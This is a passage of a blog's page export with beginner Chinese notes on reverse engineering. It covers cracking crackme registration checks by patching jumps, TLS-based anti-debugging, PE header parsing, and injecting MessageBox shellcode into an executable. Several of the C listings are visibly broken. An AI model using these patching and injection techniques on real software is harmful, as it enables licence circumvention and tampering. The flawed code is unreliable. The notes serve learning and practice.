{"/about/":{"data":{"":"\nAbout me\n🌴Beginner in the realm of binary security\n🛠️It is often said that a family that accumulates good deeds will surely have abundant blessings\n🗽With loyal determination, uphold modesty and retreat\n🥲Stop scolding, stop scolding, if you keep scolding me, I’ll become foolish"},"title":"About"},"/docs/crack/crack/":{"data":{"":"","#":"流程 程序执行的逻辑可以理解为如下：\ngraph TB A[点击注册按钮] --\u003e B[读取注册码]; B --\u003e C[判断注册码是否合法]; C --T--\u003e D[提示用户是否注册成功]; C --F--\u003e F[提示用户是否注册失败]; F --\u003e C[判断注册码是否合法]; D --\u003e C[判断注册码是否合法]; 关键就是判断注册码是否合法这一步。\n主要其实就是让程序断在注册失败的位置，然后单步跟程序返回到判断的位置。如果提示是弹窗的话就可以下断在MessageBoxA的最后面。\nIDA里面进行中文搜索：在目标中添加后缀-dCULTURE=all\n调试 进程与线程是宿主与寄宿者的关系，一个提供资源，一个使用资源。\n调试寄存器\n需要注意的如下：\nDR0-DR3\n这四个寄存器用于存储最多四个硬件断点的线性地址\nDR6\nDR6寄存器是调试状态寄存器，用于指示调试异常 (#DB) 发生的原因和状态\nL0, L1, L2, L3\n这四个位分别对应4个硬件断点（DR0 ~ DR3），用于控制断点在仅对当前任务（或当前线程）层面是否生效。当任务切换时，这些断点会被自动清除或失效。\nG0, G1, G2, G3\n这四个位也分别对应4个硬件断点（DR0 ~ DR3），用于控制断点在“全局”层面（在所有任务中都生效，不随任务切换而失效）是否启用。\n关于Dr7=1可以断，Dr7=2断不下来？的思考：\n由于Gx是设置全局断点的，设置的硬件断点将在所有任务和进程中都有效，大多数操作系统不会让你真正地对全局断点生效，要么直接忽略，要么在下一次切换或写寄存器时清掉那个Gx位，导致实际执行时并没有开启硬件断点，于是“断不下来”。一般设置Lx就可以了。\n带壳调试 壳的加载过程：\ngraph TB A[运行程序] --\u003e B[在内存中吐出真正的的代码]; B --\u003e C[转到真实的OEP]; C --\u003e D[执行真实的代码]; D --\u003e E[执行到我们需要下断点的位置]; 在壳解码后的断点可以下CreatWindowExA，LoadLibraryA。在对应位置下硬件访问断点可以看到壳是在什么位置给我们吐代码的。\n注意下断点时CreatWindowExA与CreatWindowExW都下，不是所有的A都调用W\n花指令 花指令的思路：构造恒成立的跳转，中间插无效数据。花指令防IDA，防不了动态调试。 去花指令的话可以在IDA中调试，遇到小跳的跳过去，然后把当前指令的上面直到比较的指令全部nop掉就行 TLS（线程局部存储） 特征：先于OEP执行\n函数解释：\nNtSetInformationThread：调用这个函数时，如果在第二个参数里指定0x11这个值（意思是ThreadHideFromDebugger），等于告诉操作系统，将所有附加的调试器统统取消掉。\nNtQueryInformationProcess：它的第二个参数可以用来查询进程的调试端口。如果进程被调试，那么返回的端口值会是-1，否则就是其他的值。\n反调试案例：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e #include \"ntdll/ntdll.h\" #pragma comment(linker,\"/INCLUDE:_tls_used\") DWORD isDebug = 0; void NTAPI TLS_CALLBACK(PVOID DLLHandle,DWORD Reason,PVOID Reserved) { if(Reason == DLL_PROCESS_ATTACH){ NtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0); NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, (PVOID)\u0026isDebug, sizeof(DWORD), NULL); } } int main() { MessageBoxA(NULL,\"hello\",\"hello\",MB_OK); return 0; } #pragma data_seg(\".CRT$XLX\") PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = {TLS_CALLBACK,NULL}; #pragma data_seg() 易语言特征码 字符串比较函数特征码：test edx,0x3\nmov edx,dword ptr ss:[esp+0x4] mov ecx,dword ptr ss:[esp+0x8] test edx,edx test edx,0x3 断下后注意观察ECX与EDX\n按钮事件特征码：FF55FC5F5E\n易语言体特征码：FF25\n提取特征码基本原则 一定不能包含绝对地址，如果有，一定要换成通配符 有CALL也不行，如果有，也要换成通配符 有常量也不行，如果有，也要换成通配符 "},"title":"Crack"},"/docs/crack/crackext/":{"data":{"":"","#":"IDA修改错误 修改返回值是哪个寄存器：int __usercall sub_401020\u003cedx\u003e() 壳 分类： 基于PE文件的保护：代码会在程序运行后原封不动的吐回去 基于代码的保护：吐回去的代码还是看不懂的代码 反调试 分析一下，核心代码如下，需要获取_TEB所以要导入下面的头文件：\n#include \u003cwinternl.h\u003e BOOL check() { wchar_t *Buffer; int i; bool tmp; Buffer = NtCurrentTeb()-\u003eProcessEnvironmentBlock-\u003eProcessParameters-\u003eCommandLine.Buffer; i = 256; do { if (!i) break; tmp = *Buffer++ == 0; --i; } while (!tmp); return *(Buffer - 2) != ' '; } 通过_TEB里面的_PEB获取进程启动时的命令行缓冲区，应该是它的启动参数。之后检查倒数第二个字符，因为未调试时，某些加载器或启动配置可能会在命令行尾部保留一个空格；但是双击启动的程序后面不会有参数。\n伪调试 大致原理：\n不使用正常的0xCC或者硬件断点，自己定义一个断点方式（页异常，hook等），然后接管程序的所有的断点以及调试API调用等，转过来自己实现。\nRSA 加密：明文 ^ e mod n = 密文\n解密：密文 ^ d mod n = 明文\nn的来源：任意两个互质数的乘积。比如n = p * q\ne的来源：随机取值，只需要满足1\u003ce\u003cf(p,q)\nd的来源：e * d mod f(p,q) = 1，可以推出d，欧几里得定理"},"title":"CrackEXT"},"/docs/homework/crack-homework/":{"data":{"":"","#":"2 用四种方法定位到本程序关键破解位置并爆破 下函数断点在MessageBoxA后面，之后向后跟到再次比较的位置是0x42FB03，将它NOP就不会跳到错误的位置了。 在ida中搜字符串可以找到是Tserial_button1Click@\u003ceax\u003e函数。 3 爆破这个程序，并且做出内存补丁\n还是下函数断点在MessageBoxA后面，可以看到关键跳是0x004010FD。我使用的是Baymax Patch Tools，设置异常中断补丁，由于不太会设置虚拟地址什么的，我直接用特征码进行硬件断点的设置为0F 84 39 00 00 00（就是那个关键跳的机器码），补丁类型为修改eip。保存出来之后先执行补丁，之后就成了。\n4 易语言：\n线程_启动 (\u0026子程序1, , ) 返回 (0) .子程序 子程序1 .循环判断首 () .循环判断尾 (内存读写.读字节 (到整数 (进程_取自进程ID ()), 进制_十六到十 (“4010f0”)) ≠ 83) 内存读写.写字节集 (到整数 (进程_取自进程ID ()), 进制_十六到十 (“4010fd”), { 144, 144, 144, 144, 144, 144 }) c语言实现的原理一样。\n5 不修改代码破解本程序，需说明分析思路以及解决问题的代码\n这个的程序比较输出的位置是程序的窗口名称（SetWindowTextA），F8之后可以看到是地址0x0401053在比较，而且特征码为0F 85 51 00 00 00，之后就和之前一样写一个异常补丁就好了，记住运行补丁前一定要关调试器。\n6 这个题首先是易语言写的。而且这个程序的注册逻辑是将用户输入的Key写到本地文件中，之后每次启动之后进行比较。\n易语言的特性应该是首先会执行API GetVersion。由于这个程序加了壳，所以需要将真实的代码吐出来，就在GetVersion上下断点。通过字符串搜索发现有\\\\License.Key，应该是上面说保存的本地文件，那么就断在这里看一下（0x004016D6，其实就是先断在GetVersion将代码吐出来，然后断在0x004016D6，但是一定要启用断点，调试器比较汇编指令变化后会自动将这个断点禁用）。往下找大跳转，在0x00401895位置，直接nop掉，出了。\n7 计算出正确的注册码。并且注册成功\n直接到注册控件的处理函数中，可以看到核心的代码如下：\n*v6 = GetDlgItemInt(hWnd, 1000, 0, 1); sprintf(Buffer, \"%d\", v6[0]); sub_401000(*v6); 这个*v6应该就是读取用户输入的数值，那么在sub_401000就是验证用户输入的函数：\nresult = a1 * (a1 - 23) == -102; if ( a1 * (a1 - 23) == -102 ) { result = a1 * a1 * a1; if ( result == 0x1331 ) return MessageBoxW(0, \"m`淯`O\", \u0026Caption, 0); } return result; } 算一下应该是17\n8 去花指令的话可以在IDA中调试，遇到小跳的跳过去，然后把当前指令的上面直到比较的指令全部nop掉就行：\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char v3; // [esp+0h] [ebp-11Ch] char v4; // [esp+0h] [ebp-11Ch] char Str1[136]; // [esp+10h] [ebp-10Ch] BYREF char Str[132]; // [esp+98h] [ebp-84h] BYREF meun(); memset(Str, 0, 0x80u); memset(Str1, 0, 0x80u); while ( 1 ) { memset(Str, 0, 0x80u); memset(Str1, 0, 0x80u); output(\"\\n\", v3); scanf(\u0026aS_0, Str); encode(Str, Str1, 128); strcmp(Str1, \"((++**--,,//..QQPP\"); printf(\"\\n\\n注册失败\\n\\n\", v4); } } 其中encode：\nconst char* bcc[] = \"bcdaren\"; int __cdecl encode(const char *Str, char *Str1, unsigned int 128) { signed int v4; size_t j; signed int i; if ( !Str ) return -1; if ( !Str1 || !128 ) return -1; if ( strlen(Str) \u003c= 128 ) v4 = strlen(Str); else v4 = 128; for ( i = 0; i \u003c v4; ++i ) { for ( j = 0; j \u003c strlen(\"bcdaren\"); ++j ) Str1[i] = bcc[j] ^ (Str[i] + 13); } return 0; } 这个for循环里面的j只是不停的加以，但是最后不变的就是最后的字母n，逆运算应该为：\n// for ( i = 0; i \u003c v4; ++i ) // { // Str1[i] = 'n' ^ (Str[i] + 13); // } for ( i = 0; i \u003c v4; ++i ) { Str1[i] = (Str[i] ^ 'n') - 13; } //应该可以理解为等式的移项a=b+13,那么b=a-13，然后交换一下变量位置那么a=b-13就是逆运算了 那么输入((++**--,,//..QQPP进行解密就可以了。\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e int __cdecl encode(const char *Str, char *Str1) { signed int v4; size_t j; signed int i; if ( !Str ) return -1; if ( !Str1 || !128 ) return -1; if ( strlen(Str) \u003c= 128 ) v4 = strlen(Str); else v4 = 128; for ( i = 0; i \u003c v4; ++i ) { for ( j = 0; j \u003c strlen(\"bcdaren\"); ++j ) Str1[i] = (Str[i] ^ 'n') - 13; } return 0; } int main() { char decoded_str[256] = {0}; encode(\"((++**--,,//..QQPP\",decoded_str); printf(\"%s\",decoded_str); return 0; } 9 算出正确的注册码（flag{……}）\n这里的反调试就是TLS里面有阻止调试器接收消息与检测是否被调试的功能。\n直接找回调函数，但是算法我是真的不会呀。\n10 patch脚本我用ida自带的python写的：\n在File -\u003e Script command找到，记得要将下面的IDC改为Python：\nstartaddr = 0x00402000 endaddr = 0x00402200 for i in range(startaddr,endaddr): if get_wide_byte(i) == 0xE8 and get_wide_byte(i+1) == 0x00 and get_wide_byte(i+6) == 0x04 and get_wide_byte(i+12) == 0xC3: for j in range(0,0x1C): patch_byte(i+j,0x90) if get_wide_byte(i) == 0xE8 and get_wide_byte(i+1) == 0x01 and get_wide_byte(i+6) == 0x83 and get_wide_byte(i+7) == 0x04: for k in range(0,0xA): patch_byte(i+k,0x90) "},"title":"Crack-homework"},"/docs/homework/homework/":{"data":{"":"","#":"PE结构 内存分配—文件读写 将记事本的.exe文件读取到内存，并返回读取后在内存中的地址\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void* load(const char* file_path, size_t* size) { FILE* file = fopen(file_path, \"rb\"); if (!file) { return NULL; } fseek(file, 0, SEEK_END); *size = ftell(file); fseek(file, 0, SEEK_SET); void* memory = malloc(*size); if (!memory) { fclose(file); return NULL; } size_t read_size = fread(memory, 1, *size, file); if (read_size != *size) { free(memory); fclose(file); return NULL; } fclose(file); return memory; } int main() { const char* path = \"C:\\\\Windows\\\\notepad.exe\"; size_t size = 0; void* file_memory = load(path, \u0026size); if (file_memory) { printf(\"address: %p\\n\", file_memory); printf(\"size: %zu bytes\\n\", size); } free(file_memory); } return 0; } 将内存中的数据存储到一个文件中，（.exe格式），然后双击打开，看是否能够使用\nint main() { const char* lpszFile = \"output.exe\"; FILE *pFile = NULL; FILE* fpw = fopen_s(\u0026pFile, lpszFile, \"rb\"); if(!fpw) { return 0; } if (fwrite(pMemBuffer, 1, size, fpw) == 0) { return 0; } fclose(fpw);\tfpw = NULL; return size; } PE头解析 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D8 00 00 00| 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 31 42 8C CE 75 23 E2 9D 75 23 E2 9D 75 23 E2 9D F6 3F EC 9D 7B 23 E2 9D 43 05 E8 9D 43 23 E2 9D 75 23 E3 9D 46 23 E2 9D 17 3C F1 9D 76 23 E2 9D 43 05 E9 9D 76 23 E2 9D 52 69 63 68 75 23 E2 9D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 45 00 00 |4C 01 05 00 4A 11 BE 54 00 00 00 00 00 00 00 00 E0 00 0E 01| 0B 01 06 00 00 10 02 00 00 A0 00 00 00 00 00 00 20 12 00 00 00 10 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 10 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 C0 02 00 00 10 00 00 00 00 00 00 03 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00 00 00 以这个为例吧\n找出所有DOC头数据，并统计DOC头大小\ne_magic = 4D 5A e_cblp = 90 00 e_cp = 03 00 e_crlc = 00 00 e_cparhdr = 04 00 e_minalloc = 00 00 e_maxalloc = FF FF e_ss = 00 00 e_sp = B8 00 e_csum = 00 00 e_ip = 00 00 e_cs = 00 00 e_lfarlc = 40 00 e_ovno = 00 00 e_res[4] = 00 00,00 00,00 00,00 00 e_oemid = 00 00 e_oeminfo = 00 00 e_res2[10] = 00 00,00 00,00 00,00 00,00 00,00 00,00 00,00 00,00 00,00 00 e_lfanew = D8 00 00 00 找出所有标准PE头数据，并统计标准PE头大小\nSignature = 00 00 Machine = 4C 01 NumberOfSection = 05 00 TimeDateStamp = 4A 11 BE 54 PointerToSymbolTable = 00 00 00 00 NumberOfSymbols = 00 00 00 00 SizeOfOptionalHeader = E0 00 Characteristics = 0E 01 找出所有可选PE头数据，并统计可选PE头大小\nMagic = 0B 01 MajorLinkerVersion = 06 MinorLinkerVersion = 00 SizeOfCode = 00 10 02 00 SizeOfInitializedData = 00 A0 00 00 SizeOfUninitializedData = 00 00 00 00 AddressOfEntryPoint = 20 12 00 00 BaseOfCode = 00 10 00 00 BaseOfData = 00 10 00 00 ImageBase = 00 00 40 00 SectionAlignment = 00 10 00 00 FileAlignment = 00 10 00 00 MajorOperatingSystemVersion = 04 00 MinorOperatingSystemVersion = 00 00 MajorImgdeVersion = 00 00 MinorImgdeVersion = 00 00 MajorSubsystemVersin = 04 00 MinorSubsystemVersin = 00 00 Win32VersionValue = 00 00 00 00 SizeOfImage = 00 C0 02 00 SizeOfHeaders = 00 10 00 00 CheckSum = 00 00 00 00 Subsystem = 03 00 DllCharacteristics = 00 00 SizeOfStackReserve = 00 00 10 00 SizeOfStackCommit = 00 10 00 00 SizeOfHeapReserve = 00 00 10 00 SizeOfHeapCommit = 00 10 00 00 LoadFlags = 00 00 00 00 NumberOfRvaAndSizes = 10 00 00 00 编写程序读取一个.exe文件，输出所有的PE头信息\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e #define FILEPATH \"C:\\\\Users\\\\Administrator\\\\Desktop\\\\HelloWorld.exe\" LPVOID ReadPEFile(LPSTR lpszFile) { FILE *pFile = NULL; DWORD fileSize = 0; LPVOID pFileBuffer = NULL; size_t n = 0 ; // 使用 fopen_s 来打开文件 if (fopen_s(\u0026pFile, lpszFile, \"rb\") != 0 || pFile == NULL) { return NULL; } fseek(pFile, 0, SEEK_END); fileSize = ftell(pFile); fseek(pFile, 0, SEEK_SET); pFileBuffer = malloc(fileSize); if (!pFileBuffer) { fclose(pFile); return NULL; } // 使用 size_t 类型的变量来存储 fread 的返回值 n = fread(pFileBuffer, 1, fileSize, pFile); if (n != fileSize) { free(pFileBuffer); fclose(pFile); return NULL; } fclose(pFile); return pFileBuffer; } VOID PrintNTHeaders() { LPVOID pFileBuffer = NULL; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; pFileBuffer = ReadPEFile(FILEPATH); if (!pFileBuffer) { printf(\"Error reading the file.\\n\"); return; } // 检查 DOS 头签名 if (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (DOS header signature mismatch).\\n\"); return; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; printf(\"DOS Header\\n\"); printf(\"MZ: %X\\n\", pDosHeader-\u003ee_magic); printf(\"PE Offset: %X\\n\", pDosHeader-\u003ee_lfanew); // 检查 NT 头签名 if (*((PDWORD)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (NT header signature mismatch).\\n\"); return; } pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); printf(\"\\n\\nNT Header\\n\"); printf(\"NT Signature: %X\\n\", pNTHeader-\u003eSignature); pPEHeader = \u0026pNTHeader-\u003eFileHeader; // 获取 PE 文件头 printf(\"\\n\\nPE File Header\\n\"); printf(\"Machine: %X\\n\", pPEHeader-\u003eMachine); printf(\"Number of Sections: %d\\n\", pPEHeader-\u003eNumberOfSections); printf(\"Size of Optional Header: %X\\n\", pPEHeader-\u003eSizeOfOptionalHeader); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + sizeof(IMAGE_FILE_HEADER)); printf(\"\\n\\nOptional Header\\n\"); printf(\"Magic: %X\\n\", pOptionHeader-\u003eMagic); free(pFileBuffer); // 释放文件缓冲区 } int main() { ReadPEFile(FILEPATH); PrintNTHeaders(); return 0; } 编写程序打印节表中的信息\n偏移如下： +-------------------------+ \u003c-- 文件开始 | IMAGE_DOS_HEADER | +-------------------------+ | Padding (对齐数据) | +-------------------------+ \u003c-- e_lfanew 指向这里 | IMAGE_NT_HEADERS | \u003c-- pNTHeader | - Signature (4B) | | - IMAGE_FILE_HEADER | | - IMAGE_OPTIONAL_HEADER| +-------------------------+ | IMAGE_SECTION_HEADER | \u003c-- 节表开始 | Section[0] | | Section[1] | | ... | +-------------------------+ 还有就是从pNTHeader开始找IMAGE_SECTION_HEADER的过程，其中注意sizeof(IMAGE_OPTIONAL_HEADER)是编译时定义的常量，就是理论大小;而pNTHeader-\u003eFileHeader.SizeOfOptionalHeader表示实际的 IMAGE_OPTIONAL_HEADER 大小 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e #define FILEPATH \"C:\\\\Users\\\\Administrator\\\\Desktop\\\\notepad.exe\" LPVOID ReadPEFile(LPSTR lpszFile) { FILE *pFile = NULL; DWORD fileSize = 0; LPVOID pFileBuffer = NULL; size_t n = 0; if (fopen_s(\u0026pFile, lpszFile, \"rb\") != 0 || pFile == NULL) { return NULL; } fseek(pFile, 0, SEEK_END); fileSize = ftell(pFile); fseek(pFile, 0, SEEK_SET); pFileBuffer = malloc(fileSize); if (!pFileBuffer) { fclose(pFile); return NULL; } n = fread(pFileBuffer, 1, fileSize, pFile); if (n != fileSize) { free(pFileBuffer); fclose(pFile); return NULL; } fclose(pFile); return pFileBuffer; } VOID PrintNTSections() { LPVOID pFileBuffer = NULL; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; int i = 0; char name[9] = {0}; pFileBuffer = ReadPEFile(FILEPATH); if (!pFileBuffer) { printf(\"Error reading the file.\\n\"); return; } if (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (DOS header signature mismatch).\\n\"); return; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if (*((PDWORD)((DWORD_PTR)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (NT header signature mismatch).\\n\"); return; } pNTHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pFileBuffer + pDosHeader-\u003ee_lfanew); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS) - sizeof(IMAGE_OPTIONAL_HEADER) + pNTHeader-\u003eFileHeader.SizeOfOptionalHeader); printf(\"Section Headers:\\n\"); printf(\"Name\\tVirtual Address\\tSize\\tRaw Data Pointer\\n\"); for (; i \u003c pNTHeader-\u003eFileHeader.NumberOfSections; i++) { strncpy(name, (char *)pSectionHeader[i].Name, 8); printf(\"%s\\t0x%08X\\t0x%08X\\t0x%08X\\n\", name, pSectionHeader[i].VirtualAddress, pSectionHeader[i].Misc.VirtualSize, pSectionHeader[i].PointerToRawData); } free(pFileBuffer); } int main() { PrintNTSections(); return 0; } FileBuffer-ImageBuffer 实现如下功能:\n编写一个函数，能够将RVA的值转换成FOA\n//函数声明\t//**************************************************************************\t//ReadPEFile:将文件读取到缓冲区\t//参数说明：\t//lpszFile 文件路径\t//pFileBuffer 缓冲区指针\t//返回值说明：\t//读取失败返回0 否则返回实际读取的大小\t//**************************************************************************\tDWORD ReadPEFile(IN LPSTR lpszFile,OUT LPVOID* pFileBuffer);\t{ FILE *pFile = NULL; DWORD fileSize = 0; size_t n = 0; if (fopen_s(\u0026pFile, lpszFile, \"rb\") != 0 || pFile == NULL) { return NULL; } fseek(pFile, 0, SEEK_END); fileSize = ftell(pFile); fseek(pFile, 0, SEEK_SET); pFileBuffer = malloc(fileSize); if (!pFileBuffer) { fclose(pFile); return NULL; } n = fread(pFileBuffer, 1, fileSize, pFile); if (n != fileSize) { free(pFileBuffer); fclose(pFile); return NULL; } fclose(pFile); return fileSize; } //**************************************************************************\t//CopyFileBufferToImageBuffer:将文件从FileBuffer复制到ImageBuffer\t//参数说明：\t//pFileBuffer FileBuffer指针\t//pImageBuffer ImageBuffer指针\t//返回值说明：\t//读取失败返回0 否则返回复制的大小\t//**************************************************************************\tDWORD CopyFileBufferToImageBuffer(IN LPVOID pFileBuffer,OUT LPVOID* pImageBuffer);\t{ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; int i = 1; if (pFileBuffer == NULL || pImageBuffer == NULL) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = \u0026pNTHeader-\u003eFileHeader; pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)\u0026pNTHeader-\u003eOptionalHeader; pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS)); *pImageBuffer = malloc(pOptionHeader -\u003e SizeOfImage); if (*pImageBuffer == NULL) { return 0; } memcpy(*pImageBuffer, pFileBuffer, pOptionHeader -\u003e SizeOfImage); for(;i\u003cpFileHeader-\u003eNumberOfSections;i++,pSectionHeader++) { memcpy((LPVOID)((DWORD)*ppImageBuffer+pSectionHeader-\u003eVirtualAddress),(LPVOID)((DWORD)pFileBuffer+pSectionHeader-\u003ePointerToRawData),pSectionHeader-\u003eSizeOfRawData); } return pOptionHeader -\u003e SizeOfImage; } //**************************************************************************\t//CopyImageBufferToNewBuffer:将ImageBuffer中的数据复制到新的缓冲区\t//参数说明：\t//pImageBuffer ImageBuffer指针\t//pNewBuffer NewBuffer指针\t//返回值说明：\t//读取失败返回0 否则返回复制的大小\t//**************************************************************************\tDWORD CopyImageBufferToNewBuffer(IN LPVOID pImageBuffer,OUT LPVOID* pNewBuffer); { PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; int i = 0; if(!pImageBuffer) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = \u0026pNTHeader-\u003eFileHeader; pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)\u0026pNTHeader-\u003eOptionalHeader; pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS)); memcpy(*pImageBuffer, pNewBuffer, pOptionHeader -\u003e SizeOfImage); for(;i\u003cpFileHeader-\u003eNumberOfSections;i++,pSectionHeader++) { memcpy((LPVOID)((DWORD)*ppImageBuffer+pSectionHeader-\u003eVirtualAddress),(LPVOID)((DWORD)pNewBuffer+pSectionHeader-\u003ePointerToRawData),pSectionHeader-\u003eSizeOfRawData); } return pOptionHeader -\u003e SizeOfImage; } //**************************************************************************\t//MemeryTOFile:将内存中的数据复制到文件\t//参数说明：\t//pMemBuffer 内存中数据的指针\t//size 要复制的大小\t//lpszFile 要存储的文件路径\t//返回值说明：\t//读取失败返回0 否则返回复制的大小\t//**************************************************************************\tBOOL MemeryTOFile(IN LPVOID pMemBuffer,IN size_t size,OUT LPSTR lpszFile); { FILE *pFile = NULL; FILE* fpw = fopen_s(\u0026pFile, lpszFile, \"rb\"); if(!fpw) { return 0; } if (fwrite(pMemBuffer, 1, size, fpw) == 0) { return 0; } fclose(fpw);\tfpw = NULL; return size; } //**************************************************************************\t//RvaToFileOffset:将内存偏移转换为文件偏移\t//参数说明：\t//pFileBuffer FileBuffer指针\t//dwRva RVA的值\t//返回值说明：\t//返回转换后的FOA的值 如果失败返回0\t//**************************************************************************\tDWORD RvaToFileOffset(IN LPVOID pFileBuffer,IN DWORD dwRva); { PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; DWORD sectionCount = NULL; DWORD dwFoa = 0; int i = 0; if (pFileBuffer == NULL) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = \u0026pNTHeader-\u003eFileHeader; pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)\u0026pNTHeader-\u003eOptionalHeader; pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS)); sectionCount = pNtHeaders-\u003eFileHeader.NumberOfSections; for(;i \u003c sectionCount;i++) { if(dwRva \u003e= pSectionHeader[i].VirtualAddress \u0026\u0026 dwRva \u003c pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData) { dwFoa = dwRva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData; return dwFoa; } } return 0; } 自己不会写，把大佬的全部抄了一遍（自己真的写不出来😭）\n// globlepdd.h: interface for the globlepdd class. // ////////////////////////////////////////////////////////////////////// #if !defined(AFX_GLOBLEPDD_H__DDA6AB97_A94D_41F9_B3B9_8426B6CB7934__INCLUDED_) #define AFX_GLOBLEPDD_H__DDA6AB97_A94D_41F9_B3B9_8426B6CB7934__INCLUDED_ #if _MSC_VER \u003e 1000 #pragma once #endif // _MSC_VER \u003e 1000 #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e //#define FILEPATH_IN \"C:\\\\WINDOWS\\\\system32\\\\kernel32.dll\" //#define FilePath_In \"C:\\\\Windows\\\\notepad.exe\" #define FilePath_In \"C:\\\\Windows\\\\Input.exe\" //#define FilePath_Out \"C:\\\\Windows\\\\notepadnewpes.exe\" #define FilePath_Out \"C:\\\\Windows\\\\Out.exe\" #define MESSAGEBOXADDR 0x77D5050B #define SHELLCODELENGTH 0x12 //16进制的，转换为十进制就是18 extern BYTE ShellCode[]; DWORD ReadPEFile(IN LPSTR lpszFile,OUT LPVOID* pFileBuffer); DWORD CopyFileBufferToImageBuffer(IN LPVOID pFileBuffer,OUT LPVOID* pImageBuffer); DWORD CopyImageBufferToNewBuffer(IN LPVOID pImageBuffer,OUT LPVOID* pNewBuffer); BOOL MemeryTOFile(IN LPVOID pMemBuffer,IN size_t size,OUT LPSTR lpszFile); //DWORD RvaToFileOffset(IN LPVOID pFileBuffer,IN DWORD dwRva); VOID AddCodeInCodeSec(); #endif // !defined(AFX_GLOBLEPDD_H__DDA6AB97_A94D_41F9_B3B9_8426B6CB7934__INCLUDED_) // globlepdd.cpp: implementation of the globlepdd class. // ////////////////////////////////////////////////////////////////////// #include \"stdafx.h\" #include \"globlepdd.h\" #include \u003cstring.h\u003e #include \u003cwindows.h\u003e #include \u003cstdlib.h\u003e ////////////////////////////////////////////////////////////////////// // Construction/Destruction ////////////////////////////////////////////////////////////////////// BYTE ShellCode[] = { 0x6A,00,0x6A,00,0x6A,00,0x6A,00, //push 0 0xE8,00,00,00,00, // call 0xE9,00,00,00,00 // jmp }; DWORD ReadPEFile(IN LPSTR lpszFile, OUT LPVOID* pFileBuffer) { FILE* pFile = NULL; DWORD fileSize = 0; LPVOID 